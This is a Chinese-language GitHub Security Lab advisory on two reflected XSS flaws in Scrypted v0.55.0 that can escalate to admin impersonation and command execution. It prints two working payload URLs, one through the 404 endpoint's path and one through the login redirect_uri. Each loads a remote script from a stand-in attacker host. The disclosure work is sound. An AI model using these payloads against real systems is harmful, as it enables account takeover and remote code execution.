# GHSL-2023-218_GHSL-2023-219: Scrypted中的跨站脚本攻击（XSS）

## 概述

Scrypted中存在两个反射型跨站脚本攻击（XSS）漏洞，攻击者可以通过特殊构造的链接来冒充任何用户。最严重的情况是，攻击者可能冒充管理员并执行任意命令。

### 技术背景

- **反射型XSS**：攻击者通过链接诱使用户点击，恶意脚本会在用户的浏览器中执行。
- **远程代码执行（RCE）**：攻击者能够在受害者的设备上执行命令。

### 漏洞细节

- **版本**: Scrypted v0.55.0
- **可利用因素**: 当请求的端点不存在时，`owner`和`pkg`参数会被反射回响应中。

### 漏洞示例

1. **漏洞1：通过链接加载恶意脚本**

   使用以下链接，攻击者可以在当前文档中创建一个`<script>`标签，加载恶意JavaScript文件。
   
   ```plaintext
   https://localhost:10443/endpoint/%3Cimg%20src%20onerror=a=document.createElement(‘script’);a.setAttribute(‘src’,document.location.hash.substr(1));document.head.appendChild(a)%3E/pkg#//attacker.domain/rce.js
   ```
   
   当用户点击这个链接时，`<script>`元素会被创建，并加载`https://attacker.domain/rce.js`。

2. **漏洞2：登录页面的redirect_uri参数**

   攻击者可以构造带有`javascript:`方案的`redirect_uri`参数，从而在用户登录后运行任意JavaScript代码。
   
   ```plaintext
   https://localhost:10443/endpoint/test/test?redirect_uri=javascript:var%20script%20=%20document.createElement('script');script.src%20=%20'https://attacker.domain';%20document.head.appendChild(script);#//
   ```
   
   一旦点击链接，恶意脚本会被执行，并可能导致远程代码执行。

### 举报人信息

这些问题由GHSL团队成员@Kwstubbs（Kevin Stubbings）发现，并使用CodeQL反射型XSS查询工具查找。

### 联系方式

如需进一步交流，请联系GHSL团队：securitylab@github.com，并在任何通信中提及GHSL-2023-218或GHSL-2023-219。